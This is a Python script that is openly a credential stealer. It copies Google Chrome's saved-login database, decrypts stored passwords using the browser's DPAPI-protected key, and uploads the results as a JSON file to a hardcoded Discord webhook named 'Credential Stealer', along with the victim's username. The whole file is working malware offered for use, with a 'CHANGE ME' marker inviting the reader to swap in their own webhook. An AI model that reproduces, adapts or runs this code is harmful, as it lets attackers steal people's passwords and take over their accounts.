import os
import json
import base64
import sqlite3
import shutil
from datetime import timezone, datetime, timedelta
import json
from discord_webhook import DiscordWebhook
import win32crypt
from Crypto.Cipher import AES

def getUsername():
    try:
        USERNAME = os.getlogin()
    except Exception as e:
        USERNAME = "None"
    return USERNAME

def my_chrome_datetime(time_in_mseconds):
    return datetime(1601, 1, 1) + timedelta(microseconds=time_in_mseconds)

def encryption_key():
    localState_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(localState_path, "r", encoding="utf-8") as file:
        local_state_file = file.read()
        local_state_file = json.loads(local_state_file)
    ASE_key = base64.b64decode(local_state_file["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(ASE_key, None, None, None, 0)[1]

def decrypt_password(enc_password, key):
    try:
        init_vector = enc_password[3:15]
        enc_password = enc_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, init_vector)
        return cipher.decrypt(enc_password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords(logged in with Social Account)"

def stealcreds():
    password_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Login Data")
    shutil.copyfile(password_db_path,"my_chrome_data.db")
    db = sqlite3.connect("my_chrome_data.db")
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
    encp_key = encryption_key()
    data = {}
    for row in cursor.fetchall():
        site_url = row[0]
        username = row[1]
        password = decrypt_password(row[2], encp_key)
        date_created = row[3]
        if username or password:
            data[site_url] = []
            data[site_url].append({
                "username": username,
                "password": password,
                "date_created": str(my_chrome_datetime(date_created))
                })
        else:
            continue 
    cursor.close()
    db.close()
    os.remove("my_chrome_data.db")
    
    return data

webhook = DiscordWebhook(url='https://discord.com/api/webhooks/928973980357001266/RTynSywa6JyhcZFqZt4syRuTA4wZEVlGpNEYUfvQG-ciUfcEdxDXUsg9T9O2USfO577l', username="Credential Stealer", content=f"Chrome Crdentials from: **{getUsername()}**") #CHANGE ME!!!

try:
    
    data = stealcreds()
    path = os.environ["temp"] +"\\data.json"
    with open(path, 'w+') as outfile:
        json.dump(data, outfile, indent=4)
    with open(path, "rb") as f:
        webhook.add_file(file=f.read(), filename='data.json')
    os.remove(path)

    response = webhook.execute()

except Exception as e:
    
    webhook.add_content(f"Error While Getting Chrome Credentials from {getUsername()}:\n{e}")
    response = webhook.execute()